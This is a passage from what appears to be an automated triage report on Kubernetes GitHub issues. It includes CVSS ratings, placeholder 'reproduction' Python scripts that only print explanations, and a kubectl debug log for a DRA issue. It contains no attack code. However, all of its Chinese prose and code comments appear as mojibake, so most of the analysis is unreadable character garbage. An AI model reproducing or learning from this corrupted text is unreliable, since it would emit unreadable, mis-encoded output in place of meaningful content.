        *   **Attack Complexity (AC): High** (éœ€è¦ etcd è®¿é—®ã€ç²¾ç¡®æ—¶æœºå’Œæ§åˆ¶å¹³é¢é‡å¯èƒ½åŠ›)
        *   **Privileges Required (PR): High** (éœ€è¦é›†ç¾¤ç®¡ç†å‘˜çº§åˆ«çš„æƒé™æ¥æ“ä½œ etcd å’Œæ§åˆ¶å¹³é¢)
        *   **User Interaction (UI): None**
        *   **Scope (S): Unchanged** (å½±å“å±€é™äºé›†ç¾¤å†…éƒ¨çš„è°ƒåº¦å’ŒèŠ‚ç‚¹èµ„æº)
        *   **Confidentiality (C): None**
        *   **Integrity (I): None** (ä¸»è¦æ˜¯çŠ¶æ€ä¸ä¸€è‡´ï¼Œè€Œéæ•°æ®ç¯¡æ”¹)
        *   **Availability (A): Low** (å½±å“å•ä¸ªæˆ–å°‘æ•°èŠ‚ç‚¹çš„ Pod è°ƒåº¦èƒ½åŠ›ï¼Œè€Œéæ•´ä¸ªé›†ç¾¤çš„ç˜«ç—ª)
        *   æ ¹æ® CVSS 3.1 è®¡ç®—å™¨ï¼Œ`CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:L` å¾—åˆ†çº¦ä¸º 2.2 (Low)ã€‚
    *   **æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†:**
        *   æ ‡å‡† 3ï¼šCVSS è¯„åˆ†ä½äº high (7.0)ï¼Œåº”åˆ¤æ–­ä¸ºä½é£é™©ã€‚
        *   æ ‡å‡† 5ï¼šè¯¥ DoS éœ€è¦æ”»å‡»è€…å…·å¤‡é«˜æƒé™ï¼ˆetcd æ¢å¤ã€æ§åˆ¶å¹³é¢é‡å¯ï¼‰ï¼Œæ˜ç¡®æŒ‡å‡º "å½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹"ã€‚æ­¤æƒ…å†µå®Œå…¨ç¬¦åˆï¼Œå› æ­¤ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
        *   æ ‡å‡† 7 & 8ï¼šé—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸æˆ–ä½æƒé™ç”¨æˆ·å½±å“å…¶ä»–ç”¨æˆ·çš„æƒ…å†µã€‚

4.  **ç»“è®º:** è¯¥é—®é¢˜è™½ç„¶ä¼šå¯¼è‡´èŠ‚ç‚¹èµ„æºä¸å¯ç”¨å’Œè°ƒåº¦å¤±è´¥ï¼Œä½†è§¦å‘æ¡ä»¶è‹›åˆ»ï¼Œéœ€è¦æé«˜çš„ç®¡ç†å‘˜æƒé™ã€‚æ ¹æ® CVSS è¯„åˆ†å’Œç‰¹å®šçš„ DoS é™çº§è§„åˆ™ï¼ˆæ ‡å‡† 5ï¼‰ï¼Œæ­¤é—®é¢˜åº”è¢«è¯„ä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤ Issue è¢«è¯„å®šä¸ºâ€œä½é£é™©â€ã€‚
# æ ‡å‡†è¦æ±‚ä»…é’ˆå¯¹â€œé«˜é£é™©â€é—®é¢˜æä¾›å¤ç°è„šæœ¬ã€‚
# å› æ­¤ï¼Œä¸ä¸ºæ­¤ä½é£é™©é—®é¢˜æä¾›å¤ç°è„šæœ¬ã€‚

print("è¯¥ Issue è¢«è¯„å®šä¸ºä½é£é™©ï¼Œæ— éœ€æä¾›å¤ç°è„šæœ¬ã€‚")
print("å¤ç°æ­¤é—®é¢˜éœ€è¦é«˜æƒé™æ“ä½œï¼ˆetcd å¤‡ä»½æ¢å¤ã€æ§åˆ¶å¹³é¢é‡å¯ï¼‰ï¼Œéš¾ä»¥é€šè¿‡æ™®é€šè„šæœ¬æ¨¡æ‹Ÿã€‚")
print("å…·ä½“æ‰‹åŠ¨å¤ç°æ­¥éª¤è¯·å‚è€ƒ Issue å†…å®¹ä¸­çš„æè¿°å’Œé“¾æ¥ï¼š")
print("https://github.com/tdihp/myakshack/tree/main/repros/phantompod")

def main():
    print("æ‰§è¡Œå®Œæ¯•ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æè¿°çš„é—®é¢˜è¢«è¯„ä¼°ä¸ºä½é£é™©ã€‚ä¸»è¦åŸå› æ˜¯ï¼š

1.  **æƒé™è¦æ±‚é«˜:** å¤ç°è¯¥é—®é¢˜éœ€è¦é›†ç¾¤ç®¡ç†å‘˜çº§åˆ«çš„æƒé™ï¼Œèƒ½å¤Ÿå¯¹ etcd è¿›è¡Œå¤‡ä»½å’Œæ¢å¤ï¼Œå¹¶èƒ½æ§åˆ¶æ€§åœ°é‡å¯æ§åˆ¶å¹³é¢ç»„ä»¶ã€‚è¿™å¤§å¤§é™ä½äº†å®é™…è¢«æ¶æ„åˆ©ç”¨çš„å¯èƒ½æ€§ã€‚
2.  **å½±å“èŒƒå›´æœ‰é™:** é—®é¢˜ä¸»è¦å½±å“å•ä¸ªèŠ‚ç‚¹çš„ Pod è°ƒåº¦èƒ½åŠ›ï¼Œå¯¼è‡´éƒ¨åˆ†èµ„æºä¸å¯ç”¨ï¼ˆDoSï¼‰ï¼Œä½†é€šå¸¸ä¸ä¼šå¯¼è‡´æ•´ä¸ªé›†ç¾¤ç˜«ç—ªæˆ–æ•°æ®æ³„éœ²ã€æƒé™æå‡ç­‰ä¸¥é‡åæœã€‚
3.  **ç¬¦åˆé™çº§æ ‡å‡†:** æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬ 5 æ¡ï¼Œå¯¹äºéœ€è¦é«˜æƒé™æ‰èƒ½è§¦å‘çš„ DoS æ”»å‡»ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

ç”±äºè¯¥é—®é¢˜ä¸å±äºé«˜é£é™©ç±»åˆ«ï¼ŒæŒ‰ç…§è¦æ±‚ï¼Œæ— éœ€æä¾› Python å¤ç°è„šæœ¬ã€‚æä¾›çš„ Python ä»£ç ç‰‡æ®µä»…ç”¨äºè¯´æ˜æ­¤æƒ…å†µï¼Œå¹¶æŒ‡å¼•ç”¨æˆ·å‚è€ƒ Issue ä¸­ç»™å‡ºçš„æ‰‹åŠ¨å¤ç°æ­¥éª¤ã€‚æ‰‹åŠ¨å¤ç°æ¶‰åŠå¤æ‚çš„åŸºç¡€è®¾æ–½æ“ä½œï¼ˆå¦‚ etcd å¤‡ä»½/æ¢å¤ï¼‰ï¼Œéš¾ä»¥åœ¨ç®€å•çš„ Python è„šæœ¬ä¸­å®Œå…¨è‡ªåŠ¨åŒ–å’Œæ¨¡æ‹Ÿã€‚

---


## Issue #131045 Field name mismatch in PVC status validation

- Issue é“¾æ¥ï¼š[#131045](https://github.com/kubernetes/kubernetes/issues/131045)

### Issue å†…å®¹

https://github.com/kubernetes/kubernetes/blob/ff25881bc1fe9da1dda4ec82d294b92078ae2763/pkg/apis/core/validation/validation.go#L2542

In this line, the field is set to "allocatedResourceStatus", but the PersistentVolumeClaimStatus class declares it as "AllocatedResourceStatuses"(consistent with the documentation). I'm unsure why "allocatedResourceStatus" is used here.Is this a typo, or is there a mapping logic we're missing?

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æŒ‡å‡ºäº† Kubernetes ä»£ç ä¸­ `pkg/apis/core/validation/validation.go` æ–‡ä»¶ L2542 è¡Œå¤„çš„ä¸€ä¸ªå­—æ®µåä¸åŒ¹é…é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œåœ¨éªŒè¯ `PersistentVolumeClaimStatus`ï¼ˆPVC çŠ¶æ€ï¼‰æ—¶ï¼Œä»£ç ä¸­ç”¨äºç”Ÿæˆé”™è¯¯è·¯å¾„çš„å­—æ®µåæ˜¯ `"allocatedResourceStatus"`ï¼Œè€Œ `PersistentVolumeClaimStatus` ç»“æ„ä½“ä¸­å®šä¹‰çš„ï¼ˆä»¥åŠæ–‡æ¡£ä¸­è®°å½•çš„ï¼‰å®é™…å­—æ®µåæ˜¯ `"AllocatedResourceStatuses"`ï¼ˆæ³¨æ„æœ«å°¾çš„ 'es'ï¼‰ã€‚

æ½œåœ¨å½±å“åˆ†æï¼š
1.  **é”™è¯¯ä¿¡æ¯ä¸å‡†ç¡®**ï¼šå¦‚æœæ¶‰åŠ `AllocatedResourceStatuses` å­—æ®µçš„éªŒè¯å¤±è´¥ï¼ŒAPI æœåŠ¡å™¨è¿”å›ç»™ç”¨æˆ·çš„é”™è¯¯ä¿¡æ¯ä¸­ï¼Œå­—æ®µè·¯å¾„ï¼ˆfield pathï¼‰å°†æŒ‡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„å­—æ®µ (`status.allocatedResourceStatus`)ï¼Œè€Œä¸æ˜¯å®é™…å­˜åœ¨é—®é¢˜çš„å­—æ®µ (`status.allocatedResourceStatuses`)ã€‚è¿™ä¼šç»™ç”¨æˆ·è¯Šæ–­é—®é¢˜å¸¦æ¥å›°æƒ‘ã€‚
2.  **éªŒè¯é€»è¾‘å¯èƒ½å¤±æ•ˆ**ï¼šæ›´ä¸¥é‡çš„æƒ…å†µæ˜¯ï¼Œå¦‚æœéªŒè¯é€»è¾‘ä¾èµ–äºè¿™ä¸ªé”™è¯¯çš„å­—æ®µåæ¥æŸ¥æ‰¾æˆ–æ“ä½œæ•°æ®ï¼Œé‚£ä¹ˆå¯¹ `AllocatedResourceStatuses` å­—æ®µçš„éªŒè¯å¯èƒ½å®Œå…¨æ²¡æœ‰æŒ‰é¢„æœŸæ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´ï¼š
    *   **æ¥å—æ— æ•ˆçŠ¶æ€**ï¼šåŒ…å«æ— æ•ˆ `AllocatedResourceStatuses` æ•°æ®çš„ PVC çŠ¶æ€æ›´æ–°è¯·æ±‚å¯èƒ½è¢«é”™è¯¯åœ°æ¥å—ã€‚è¿™å¯èƒ½å¯¼è‡´åç»­ä¾èµ–æ­¤çŠ¶æ€çš„æ§åˆ¶å™¨ï¼ˆå¦‚è°ƒåº¦å™¨ã€ç‰¹å®š CSI é©±åŠ¨æ§åˆ¶å™¨ç­‰ï¼‰è¡Œä¸ºå¼‚å¸¸ï¼Œå¯èƒ½å½±å“èµ„æºåˆ†é…ã€è°ƒåº¦å†³ç­–æˆ–å­˜å‚¨åŠŸèƒ½ã€‚
    *   **æ‹’ç»æœ‰æ•ˆçŠ¶æ€ï¼ˆå¯èƒ½æ€§è¾ƒä½ï¼‰**ï¼šå¦‚æœéªŒè¯é€»è¾‘å› ä¸ºæ‰¾ä¸åˆ° `allocatedResourceStatus` è€Œæ„å¤–å¤±è´¥ï¼Œå¯èƒ½ä¼šæ‹’ç»æœ¬åº”æœ‰æ•ˆçš„ PVC çŠ¶æ€æ›´æ–°ã€‚

å®‰å…¨é£é™©è¯„ä¼°ï¼š
*   **æœºå¯†æ€§ï¼ˆConfidentialityï¼‰**ï¼šæ­¤é—®é¢˜ä¸å¤ªå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚
*   **å®Œæ•´æ€§ï¼ˆIntegrityï¼‰**ï¼šå¦‚æœéªŒè¯é€»è¾‘å¤±æ•ˆå¯¼è‡´æ¥å—äº†æ— æ•ˆçš„ `AllocatedResourceStatuses` çŠ¶æ€ï¼Œè¿™ä¼šç ´åé›†ç¾¤çŠ¶æ€çš„å®Œæ•´æ€§ï¼Œä½†ä¸»è¦æ˜¯åŠŸèƒ½å±‚é¢çš„ï¼Œè€Œéç›´æ¥çš„å®‰å…¨ç¯¡æ”¹ã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤ç¼ºé™·ç›´æ¥ä¿®æ”¹ä»»æ„æ•°æ®æˆ–æå‡æƒé™ã€‚å½±å“èŒƒå›´ä¸»è¦å±€é™äºä¸è¯¥ PVC ç›¸å…³çš„èµ„æºç®¡ç†å’Œè°ƒåº¦ã€‚
*   **å¯ç”¨æ€§ï¼ˆAvailabilityï¼‰**ï¼š
    *   å¦‚æœå¯¼è‡´æ‹’ç»æœ‰æ•ˆè¯·æ±‚ï¼Œåˆ™æ„æˆä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ï¼Œé˜»æ­¢ç”¨æˆ·æˆ–æ§åˆ¶å™¨æ›´æ–° PVC çŠ¶æ€ã€‚
    *   å¦‚æœå¯¼è‡´æ¥å—æ— æ•ˆçŠ¶æ€ï¼Œå¯èƒ½å¼•èµ·æ§åˆ¶å™¨å¼‚å¸¸ï¼Œé—´æ¥å½±å“ç›¸å…³ Pod çš„è°ƒåº¦æˆ–å­˜å‚¨å·çš„å¯ç”¨æ€§ï¼Œä¹Ÿå¯èƒ½æ„æˆä¸€ç§ DoSã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡† #5ï¼Œè¿™ç§ DoS é€šå¸¸éœ€è¦æ”»å‡»è€…å…·å¤‡ä¿®æ”¹ PVC æˆ–å…¶çŠ¶æ€çš„æƒé™ï¼ˆé€šå¸¸æ˜¯é›†ç¾¤ç®¡ç†å‘˜æˆ–ç‰¹å®šçš„æ§åˆ¶å™¨æœåŠ¡è´¦æˆ·ï¼Œæ™®é€šç”¨æˆ·é€šå¸¸åªèƒ½åˆ›å»º/ä¿®æ”¹ PVC spec è€Œé statusï¼‰ã€‚å› æ­¤ï¼Œå³ä½¿å‘ç”Ÿ DoSï¼Œå…¶åˆ©ç”¨æ¡ä»¶ä¹Ÿç›¸å¯¹è¾ƒé«˜ï¼Œä¸åº”è¯„ä¸ºé«˜é£é™©ã€‚
*   **å‘½ä»¤æ‰§è¡Œ/ææƒ/å®¹å™¨é€ƒé€¸**ï¼šè¯¥é—®é¢˜ä¸è¿™äº›é«˜é£é™©æ¼æ´ç±»å‹æ— å…³ã€‚
*   **å¤šç”¨æˆ·å½±å“**ï¼šä¸€ä¸ªç”¨æˆ·ï¼ˆæˆ–æ§åˆ¶å™¨ï¼‰è§¦å‘æ­¤é—®é¢˜ä¸»è¦å½±å“ä¸å…¶è‡ªèº«ç›¸å…³çš„ PVC å’Œå·¥ä½œè´Ÿè½½ï¼Œä¸å¤ªå¯èƒ½ç›´æ¥è·¨è¶Šæƒé™è¾¹ç•Œå½±å“å…¶ä»–ç”¨æˆ·ã€‚

ç»“è®ºï¼šè¿™æ˜¯ä¸€ä¸ªä»£ç æ­£ç¡®æ€§é—®é¢˜ï¼ˆå¾ˆå¯èƒ½æ˜¯ typoï¼‰ï¼Œå…¶ä¸»è¦å½±å“æ˜¯åŠŸèƒ½æ€§çš„ï¼Œå¯èƒ½å¯¼è‡´éªŒè¯é€»è¾‘ä¸æ­£ç¡®ã€é”™è¯¯ä¿¡æ¯è¯¯å¯¼ï¼Œä»¥åŠæ½œåœ¨çš„ä½çº§åˆ«å¯ç”¨æ€§ï¼ˆDoSï¼‰æˆ–å®Œæ•´æ€§ï¼ˆé›†ç¾¤çŠ¶æ€ä¸ä¸€è‡´ï¼‰é—®é¢˜ã€‚å®ƒä¸æ»¡è¶³é«˜é£é™©æ¼æ´çš„æ¡ä»¶ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ­¤é—®é¢˜æ˜¯ä¸€ä¸ªä»£ç çº§åˆ«çš„å­—æ®µåæ‹¼å†™é”™è¯¯ï¼Œå½±å“çš„æ˜¯ API æœåŠ¡å™¨å†…éƒ¨çš„éªŒè¯é€»è¾‘å’Œé”™è¯¯æŠ¥å‘Šã€‚
# å®ƒé€šå¸¸åœ¨ç‰¹å®šæ§åˆ¶å™¨ï¼ˆå¦‚ CSI é©±åŠ¨ç›¸å…³æ§åˆ¶å™¨ï¼‰æ›´æ–° PVC Status æ—¶ï¼Œ
# ä¸”ç›¸å…³ç‰¹æ€§ï¼ˆå¦‚ VolumeAttributesClassï¼‰è¢«ä½¿ç”¨æ—¶æ‰å¯èƒ½è¢«è§¦å‘ã€‚
# ç¼–å†™ä¸€ä¸ªé€šç”¨çš„ã€èƒ½åœ¨ä»»æ„é›†ç¾¤ç¨³å®šå¤ç°æ­¤é—®é¢˜çš„ POC éå¸¸å›°éš¾ï¼Œå› ä¸ºå®ƒä¾èµ–äºï¼š
# 1. é›†ç¾¤ä¸­æ˜¯å¦å¯ç”¨äº†ä¾èµ– `AllocatedResourceStatuses` å­—æ®µçš„ç›¸å…³ç‰¹æ€§ã€‚
# 2. æ˜¯å¦æœ‰æ§åˆ¶å™¨ä¼šå°è¯•å¡«å……å¹¶è§¦å‘æ­¤å­—æ®µçš„éªŒè¯é€»è¾‘ã€‚
# 3. éªŒè¯é€»è¾‘çš„å…·ä½“å®ç°ï¼ˆè¯¥å­—æ®µåçš„é”™è¯¯æ˜¯å¦çœŸçš„å¯¼è‡´éªŒè¯è·³è¿‡æˆ–å¤±è´¥ï¼‰ã€‚
#
# ç›´æ¥é€šè¿‡æ ‡å‡†çš„ PVC åˆ›å»º/æ›´æ–°æ“ä½œå¾ˆéš¾è§¦å‘ status éƒ¨åˆ†çš„è¿™ä¸ªç‰¹å®šéªŒè¯è·¯å¾„ã€‚
# é€šå¸¸éœ€è¦æ¨¡æ‹Ÿæ§åˆ¶å™¨è¡Œä¸ºæˆ–ç›´æ¥ Patch PVC statusï¼ˆéœ€è¦é«˜æƒé™ï¼‰ã€‚
#
# ç”±äºè¯¥é—®é¢˜é£é™©è¯„çº§ä¸ºâ€œä½é£é™©â€ï¼Œä¸”å¤ç°æ¡ä»¶å¤æ‚ã€ä¸ç›´æ¥å¯åˆ©ç”¨ï¼Œ
# åŒæ—¶ä¸»è¦å½±å“æ˜¯éªŒè¯é€»è¾‘å’Œé”™è¯¯ä¿¡æ¯å‡†ç¡®æ€§ï¼Œè€Œéå¼•å…¥ä¸¥é‡å®‰å…¨æ¼æ´ï¼Œ
# å› æ­¤ä¸æä¾›å…·ä½“çš„å¤ç° POC è„šæœ¬ã€‚
#
# éªŒè¯æ­¤é—®é¢˜çš„æœ€ä½³æ–¹å¼æ˜¯é€šè¿‡ä»£ç å®¡è®¡ï¼ˆIssue æœ¬èº«å°±æ˜¯è¿™ä¹ˆå‘ç°çš„ï¼‰
# æˆ–åœ¨å¯ç”¨ç›¸å…³ç‰¹æ€§çš„ Kubernetes å¼€å‘/æµ‹è¯•ç¯å¢ƒä¸­ï¼Œ
# æ„é€ ç‰¹å®šçš„ PVC çŠ¶æ€æ›´æ–°è¯·æ±‚ï¼ˆå¯èƒ½éœ€è¦ç›´æ¥è°ƒç”¨ API Patch status å­èµ„æºï¼‰ï¼Œ
# å¹¶è§‚å¯Ÿ API Server è¿”å›çš„é”™è¯¯ä¿¡æ¯ä¸­çš„å­—æ®µè·¯å¾„æ˜¯å¦é”™è¯¯ï¼Œ
# æˆ–è€…è§‚å¯Ÿæ˜¯å¦èƒ½æäº¤åŒ…å«æ— æ•ˆ AllocatedResourceStatuses æ•°æ®çš„çŠ¶æ€ã€‚

print("è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ Kubernetes æºä»£ç ä¸­çš„ä¸€ä¸ªå­—æ®µåæ‹¼å†™é”™è¯¯ã€‚")
print("è¿™æ˜¯ä¸€ä¸ªä½é£é™©çš„ä»£ç æ­£ç¡®æ€§é—®é¢˜ï¼Œä¸»è¦å½±å“éªŒè¯é€»è¾‘å’Œé”™è¯¯æŠ¥å‘Šçš„å‡†ç¡®æ€§ã€‚")
print("ç”±äºå¤ç°æ¡ä»¶å¤æ‚ä¸”ä¾èµ–ç‰¹å®šé›†ç¾¤é…ç½®å’Œæ§åˆ¶å™¨è¡Œä¸ºï¼Œå¹¶ä¸”é£é™©ç­‰çº§è¾ƒä½ï¼Œå› æ­¤ä¸æä¾›è‡ªåŠ¨åŒ–å¤ç° POCã€‚")
print("éªŒè¯å»ºè®®é€šè¿‡ä»£ç å®¡æŸ¥æˆ–åœ¨ç‰¹å®šæµ‹è¯•ç¯å¢ƒä¸­æ‰‹åŠ¨æ„é€ è¯·æ±‚è¿›è¡Œã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿° Python ä»£ç å¹¶æœªå®ç°çœŸæ­£çš„å¤ç°é€»è¾‘ã€‚åŸå› å¦‚ä¸‹ï¼š

1.  **é—®é¢˜æ€§è´¨**ï¼šè¯¥ Issue æŒ‡å‡ºçš„æ ¸å¿ƒé—®é¢˜æ˜¯ Kubernetes API æœåŠ¡å™¨æºä»£ç ä¸­éªŒè¯é€»è¾‘çš„ä¸€éƒ¨åˆ†ä½¿ç”¨äº†é”™è¯¯çš„å­—æ®µåå­—ç¬¦ä¸² (`allocatedResourceStatus` è€Œé `AllocatedResourceStatuses`) æ¥æ„å»ºé”™è¯¯è·¯å¾„ã€‚è¿™æ˜¯ä¸€ä¸ªé™æ€çš„ä»£ç ç¼ºé™·ã€‚
2.  **å¤ç°éš¾åº¦**ï¼šè¦å®é™…è§¦å‘è¿™ä¸ªé”™è¯¯çš„éªŒè¯è·¯å¾„å¹¶è§‚å¯Ÿå…¶å½±å“ï¼ˆä¾‹å¦‚ï¼Œæ”¶åˆ°è·¯å¾„é”™è¯¯çš„éªŒè¯é”™è¯¯ï¼Œæˆ–è€…å‘ç°éªŒè¯è¢«è·³è¿‡ï¼‰ï¼Œéœ€è¦æ»¡è¶³ç‰¹å®šæ¡ä»¶ï¼š
    *   ç›¸å…³çš„ Kubernetes ç‰¹æ€§ï¼ˆå¯èƒ½æ¶‰åŠ `VolumeAttributesClass` æˆ–ç±»ä¼¼åŠŸèƒ½ï¼‰å¿…é¡»è¢«å¯ç”¨ã€‚
    *   å¿…é¡»æœ‰ä¸€ä¸ªæ“ä½œï¼ˆé€šå¸¸æ¥è‡ªæŸä¸ªæ§åˆ¶å™¨ï¼Œè€Œä¸æ˜¯æ™®é€šç”¨æˆ·åˆ›å»º PVCï¼‰å°è¯•å»æ›´æ–° PVC çš„ `status.allocatedResourceStatuses` å­—æ®µã€‚
    *   æ›´æ–°çš„æ•°æ®éœ€è¦èƒ½å¤Ÿè§¦å‘è¯¥éªŒè¯é€»è¾‘ï¼ˆä¾‹å¦‚ï¼Œæ ¼å¼é”™è¯¯æˆ–å†…å®¹æ— æ•ˆï¼‰ã€‚
    *   ç›´æ¥é€šè¿‡ç”¨æˆ·åˆ›å»ºæˆ–ä¿®æ”¹ PVC `spec` çš„æ ‡å‡†æµç¨‹é€šå¸¸ä¸ä¼šç›´æ¥è®¾ç½®æˆ–éªŒè¯ `status.allocatedResourceStatuses`ã€‚å¯èƒ½éœ€è¦é€šè¿‡ `PATCH` è¯·æ±‚ç›´æ¥ä¿®æ”¹ PVC çš„ `status` å­èµ„æºï¼Œè¿™éœ€è¦è¾ƒé«˜çš„æƒé™ã€‚
3.  **é£é™©è¯„çº§**ï¼šå¦‚åˆ†æå†…å®¹æ‰€è¿°ï¼Œè¯¥é—®é¢˜è¢«è¯„ä¸ºâ€œä½é£é™©â€ã€‚å®ƒä¸»è¦æ˜¯ä»£ç è´¨é‡å’ŒåŠŸèƒ½æ­£ç¡®æ€§é—®é¢˜ï¼Œæ½œåœ¨çš„ DoS æˆ–å®Œæ•´æ€§å½±å“æœ‰é™ï¼Œä¸”åˆ©ç”¨æ¡ä»¶è¾ƒé«˜ï¼Œä¸æ»¡è¶³æä¾›å¼ºåˆ¶æ€§ POC çš„é«˜é£é™©æ ‡å‡†ã€‚
4.  **POC ä»·å€¼**ï¼šå³ä½¿èƒ½å¤Ÿæ„é€ ä¸€ä¸ªå¤æ‚çš„åœºæ™¯æ¥è§¦å‘è¿™ä¸ªé—®é¢˜ï¼Œå…¶ç»“æœä¹Ÿä»…ä»…æ˜¯è¯æ˜äº†ä»£ç ä¸­ç¡®å®å­˜åœ¨è¿™ä¸ªæ‹¼å†™é”™è¯¯ï¼ˆè¿™é€šè¿‡ä»£ç æœ¬èº«å°±èƒ½ç¡®è®¤ï¼‰ï¼Œæˆ–è€…è§‚å¯Ÿåˆ°é”™è¯¯çš„é”™è¯¯ä¿¡æ¯è·¯å¾„/å¯èƒ½å¤±æ•ˆçš„éªŒè¯ã€‚è¿™å¯¹äºè¯æ˜ä¸€ä¸ªä½é£é™©çš„åŠŸèƒ½æ€§ bug æ¥è¯´ï¼Œç¼–å†™é€šç”¨ POC çš„æŠ•å…¥äº§å‡ºæ¯”è¾ƒä½ã€‚

å› æ­¤ï¼Œè„šæœ¬ä»…æ‰“å°è§£é‡Šæ€§ä¿¡æ¯ï¼Œè¯´æ˜äº†é—®é¢˜çš„æ€§è´¨ã€å¤ç°çš„å›°éš¾ä»¥åŠä¸æä¾›å®é™… POC çš„ç†ç”±ã€‚ä¿®å¤è¿™ä¸ªé—®é¢˜éœ€è¦ç›´æ¥ä¿®æ”¹ Kubernetes æºä»£ç ä¸­æŒ‡å‡ºçš„é‚£ä¸€è¡Œã€‚

---


## Issue #131044 resourceClaimTemplate in Pod.Spec is changed to nil when the manifest is submitted to api-server

- Issue é“¾æ¥ï¼š[#131044](https://github.com/kubernetes/kubernetes/issues/131044)

### Issue å†…å®¹

#### What happened?

I set the dra feature-gate to true in kube-apiserver, kube-controller-manager, kubelet and kube-scheduler. and set the runtime-config to `api/all` for the api-server.

- kube-apiserver:

```
    - --feature-gates=DynamicResourceAllocation=true
    - --runtime-config=api/all=true
```

- kube-controller-manager, kube-scheduler:

```
    - --feature-gates=DynamicResourceAllocation=true
```

I created the daemonset and configure the resourceClaims in pod.spec, see below:

```
      resourceClaims:
      - name: demo-static
        resourceClaimTemplateName: demo-static
```

and I submitted the daemonset.yaml:

```
~# kubectl apply -f daemonset.yaml -v 9
...
I0325 11:48:28.411463 3206159 round_trippers.go:584] Response Headers:
I0325 11:48:28.411497 3206159 round_trippers.go:587]     Cache-Control: no-cache, private
I0325 11:48:28.411507 3206159 round_trippers.go:587]     Content-Type: application/json
I0325 11:48:28.411524 3206159 round_trippers.go:587]     X-Kubernetes-Pf-Flowschema-Uid: c170b105-c632-487e-800c-2b7e48b70984
I0325 11:48:28.411538 3206159 round_trippers.go:587]     X-Kubernetes-Pf-Prioritylevel-Uid: b1672c8d-17a9-49ac-858a-633e8682d346
I0325 11:48:28.411551 3206159 round_trippers.go:587]     Date: Tue, 25 Mar 2025 03:48:28 GMT
I0325 11:48:28.411563 3206159 round_trippers.go:587]     Audit-Id: c04dd822-6db2-4bed-869b-e525ee85d59d
I0325 11:48:28.411977 3206159 helper.go:105] "Response Body" body=<
	{"kind":"DaemonSet","apiVersion":"apps/v1","metadata":{"name":"demo-dra","namespace":"default","uid":"7ff48efd-fdfe-40a6-816a-b371b8ecce43","resourceVersion":"164918541","generation":1,"creationTimestamp":"2025-03-25T02:20:02Z","annotations":{"deprecated.daemonset.template.generation":"1","kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"apps/v1\",\"kind\":\"DaemonSet\",\"metadata\":{\"annotations\":{},\"name\":\"demo-dra\",\"namespace\":\"default\"},\"spec\":{\"revisionHistoryLimit\":10,\"selector\":{\"matchLabels\":{\"app\":\"rdma-test-gpu-tool\"}},\"template\":{\"metadata\":{\"labels\":{\"app\":\"rdma-test-gpu-tool\"}},\"spec\":{\"containers\":[{\"env\":[{\"name\":\"ENV_POD_NAME\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"metadata.name\"}}},{\"name\":\"ENV_LOCAL_NODE_IP\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"status.hostIP\"}}},{\"name\":\"ENV_LOCAL_NODE_NAME\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"spec.nodeName\"}}},{\"name\":\"ENV_SERVICE_NAME\",\"value\":\"rdma-test-gpu-tool\"},{\"name\":\"ENV_POD_NAMESPACE\",\"valueFrom\":{\"fieldRef\":{\"apiVersion\":\"v1\",\"fieldPath\":\"metadata.namespace\"}}}],\"image\":\"ghcr.m.daocloud.io/spidernet-io/rdma-tools:12.5.1-898cf75813bf866d1ba576ce7484065c0fd237e8\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"rdma-test\",\"ports\":[{\"containerPort\":22,\"name\":\"ssh\",\"protocol\":\"TCP\"}],\"readinessProbe\":{\"exec\":{\"command\":[\"sh\",\"-c\",\"ls /tmp/ready\"]},\"failureThreshold\":3,\"periodSeconds\":10,\"successThreshold\":1,\"timeoutSeconds\":1}}],\"resourceClaims\":[{\"name\":\"demo-static\",\"resourceClaimTemplateName\":\"demo-static\"}]}}}}\n"},"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"apps/v1","time":"2025-03-25T02:20:02Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:desiredNumberScheduled":{},"f:numberUnavailable":{},"f:observedGeneration":{}}},"subresource":"status"},{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"apps/v1","time":"2025-03-25T02:20:02Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:deprecated.daemonset.template.generation":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{"f:revisionHistoryLimit":{},"f:selector":{},"f:template":{"f:metadata":{"f:labels":{".":{},"f:app":{}}},"f:spec":{"f:containers":{